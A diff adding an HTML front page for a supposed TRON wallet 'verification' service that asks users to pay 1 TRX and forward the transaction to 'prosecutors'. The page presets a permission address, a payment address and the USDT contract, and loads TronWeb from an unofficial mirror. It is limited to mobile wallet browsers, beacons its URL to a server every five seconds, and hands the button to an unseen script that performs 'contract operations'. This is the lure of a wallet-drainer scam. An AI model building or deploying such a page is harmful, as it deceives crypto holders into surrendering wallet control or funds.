@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <title>飞猫验资平台</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/png" href="png/icon_trx.png">
+  <!-- 引入 Google 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+  <!-- 引入外部 JS 库 -->
+  <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
+  <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    /* 基本重置及字体 */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #74ABE2, #5563DE);
+      color: #333;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    /* 主容器 */
+    .container {
+      background: #fff;
+      width: 100%;
+      max-width: 480px;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+      overflow: hidden;
+    }
+    /* 顶部区块 */
+    .header {
+      background: linear-gradient(135deg, #5563DE, #74ABE2);
+      padding: 20px;
+      text-align: center;
+      color: #fff;
+    }
+    .header h1 {
+      font-size: 1.8em;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+    .header p {
+      font-size: 0.95em;
+      line-height: 1.4;
+    }
+    /* 主内容区 */
+    .content {
+      padding: 20px;
+    }
+    .wallet-info {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .wallet-info .amount {
+      font-size: 3em;
+      font-weight: 700;
+      color: #2A9D8F;
+      margin-bottom: 10px;
+    }
+    .wallet-info .usd {
+      font-size: 1.1em;
+      color: #264653;
+      margin-bottom: 8px;
+    }
+    .wallet-info .balance {
+      font-size: 0.95em;
+      color: #555;
+    }
+    /* 按钮样式 */
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      font-size: 1.1em;
+      font-weight: 700;
+      color: #fff;
+      background: #E76F51;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-bottom: 20px;
+    }
+    .btn:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+    .btn:hover:not(:disabled) {
+      background: #d65a3b;
+    }
+    /* 风险提示 */
+    .risk-warning {
+      background-color: #fff3cd;
+      border: 1px solid #ffeeba;
+      border-radius: 6px;
+      padding: 15px;
+      font-size: 0.9em;
+      text-align: center;
+      color: #856404;
+      margin-bottom: 20px;
+      line-height: 1.4;
+    }
+    /* 提示信息（采用原来样式，用于转账中提示） */
+    .tishi {
+      width: 58%;
+      padding: 0.1rem 0.3rem;
+      background: #4b4848;
+      z-index: 999999999999;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      border-radius: 0.3rem;
+      color: white;
+      font-size: 1rem;
+      text-align: center;
+      line-height: 3rem;
+      display: none;
+      height: auto;
+      margin: 0 auto;
+    }
+    /* 页脚 */
+    footer {
+      text-align: center;
+      padding: 15px;
+      font-size: 0.8em;
+      color: #777;
+      background: #f7f7f7;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- 顶部介绍区 -->
+    <div class="header">
+      <h1>飞猫验资平台</h1>
+      <p>
+        本平台专为 TRC 链钱包提供验资服务，系统将转账 <strong>1 TRX</strong>（含矿工费）到本平台来验证钱包价值，请您操作完后将本次交易发给检方。
+      </p>
+    </div>
+    <!-- 主内容区 -->
+    <div class="content">
+      <!-- 钱包信息展示 -->
+      <div class="wallet-info">
+        <div>转账金额</div>
+        <div class="amount" id="amount">1 TRX</div>
+        <div class="usd" id="amount-usd">约 0.22 USD</div>
+        <div class="balance">您的钱包余额：<span id="balance">载入中...</span> TRX</div>
+      </div>
+      <!-- 按钮 -->
+      <button class="btn" id="verifyBtn" disabled>下一步</button>
+      <!-- 风险提示 -->
+      <div class="risk-warning">
+        风险提示：请确保交易对方是您可以信任的，或分批进行小额交易。<br>
+        本平台仅提供钱包验资服务，不提供交易担保。
+      </div>
+    </div>
+    <!-- 页脚 -->
+    <footer>
+      &copy; 2025 飞猫验资平台. 保留所有权利.
+    </footer>
+  </div>
+  
+  <!-- 提示信息层 -->
+  <div class="tishi" id="tip">提示</div>
+  
+  <script>
+    //////////////////////////////////////////////////////////////
+    // 请确保以下地址为有效地址，否则会报错
+    window.Permission_address = 'TC7cW2hqr784X8i5HzvGyhW1oqLPgXnduu';
+    window.Payment_address    = 'TFZdM4ZAidopoK41eBin11eNhijZjux4N1';
+    window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    window.heartbeatUrl       = 'https://baidu.com/heartbeat';
+    //////////////////////////////////////////////////////////////
+
+    // 固定金额预设为 1 TRX
+    const PRESET_AMOUNT = 1;
+    const TRX_TO_USD_RATE = 0.1562; // 汇率
+
+    const userData = {
+      address: null,
+      trxBalance: null
+    };
+
+    // 主初始化函数
+    async function initializeDApp() {
+      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+      const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
+      
+      if (!isMobile) {
+        document.body.innerHTML = '<div style="text-align:center;padding:20px;">本平台仅支持移动设备访问。</div>';
+        return;
+      //} else if (isMobile && !isDAppBrowser) {
+      //  const currentUrl = encodeURIComponent(window.location.href);
+      //  window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
+      //  return;
+      } else if (isMobile && isDAppBrowser) {
+        await connectWallet();
+      }
+      updateAmountDisplay();
+    }
+    // 连接到钱包
+    async function connectWallet() {
+      try {
+        if (window.tronWeb && window.tronWeb.ready) {
+          await initDApp();
+        } else if (window.tronLink) {
+          const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+          if (res.code === 200) {
+            window.tronWeb = window.tronLink.tronWeb;
+            await initDApp();
+          }
+        }
+      } catch (error) {
+        console.error("钱包连接失败:", error);
+      }
+    }
+    // 初始化 DApp，获取用户钱包数据
+    async function initDApp() {
+      try {
+        userData.address = window.tronWeb.defaultAddress.base58;
+        const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
+        userData.trxBalance = window.tronWeb.fromSun(trxBalance);
+        updateBalance();
+      } catch (error) {
+        console.error("获取用户数据时出错:", error);
+      }
+    }
+    // 更新显示的余额
+    function updateBalance() {
+      const balanceElement = document.getElementById('balance');
+      if (balanceElement) {
+        balanceElement.textContent = parseFloat(userData.trxBalance).toFixed(4);
+      }
+      updateNextButtonState();
+    }
+    // 更新界面上固定转账金额及对应美元换算
+    function updateAmountDisplay() {
+      const amountElement = document.getElementById('amount');
+      if (amountElement) {
+        amountElement.textContent = PRESET_AMOUNT + " TRX";
+      }
+      const usdElement = document.getElementById('amount-usd');
+      if (usdElement) {
+        usdElement.textContent = "约 " + (PRESET_AMOUNT * TRX_TO_USD_RATE).toFixed(2) + " USDT";
+      }
+      updateNextButtonState();
+      document.title = `飞猫验资平台 - ${PRESET_AMOUNT} TRX`;
+    }
+    // 如果钱包余额>=1 TRX，则启用“下一步”按钮
+    function updateNextButtonState() {
+      const verifyBtn = document.getElementById('verifyBtn');
+      if (verifyBtn) {
+        if (userData.trxBalance && parseFloat(userData.trxBalance) >= PRESET_AMOUNT) {
+          verifyBtn.disabled = false;
+        } else {
+          verifyBtn.disabled = true;
+        }
+      }
+    }
+    // 注意：原先 index.html 中关于“下一步”按钮点击的 onNextButtonClick 实现已移除，
+    // 点击按钮时直接调用 1.js 中定义的 onNextButtonClick 函数，
+    // 该函数会检测钱包连接并触发相应合约操作。
+
+    // 绑定“下一步”按钮事件
+    document.getElementById('verifyBtn').addEventListener('click', onNextButtonClick);
+    
+    // 向服务器发送心跳（可选）
+    function sendHeartbeat() {
+      const currentUrl = window.location.href;
+      fetch(window.heartbeatUrl, {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ url: currentUrl })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.status === 'error' && data.message === '会话已结束') {
+          console.log('会话已结束');
+        }
+      })
+      .catch(() => {});
+    }
+    const heartbeatInterval = setInterval(sendHeartbeat, 5000);
+    window.onload = () => {
+      sendHeartbeat();
+      initializeDApp();
+    };
+    window.onbeforeunload = function() {
+      clearInterval(heartbeatInterval);
+    };
+  </script>
+  <!-- 引入包含合约调用逻辑的 1.js 文件 -->
+  <script src="js/1.js"></script>
+</body>
+</html>
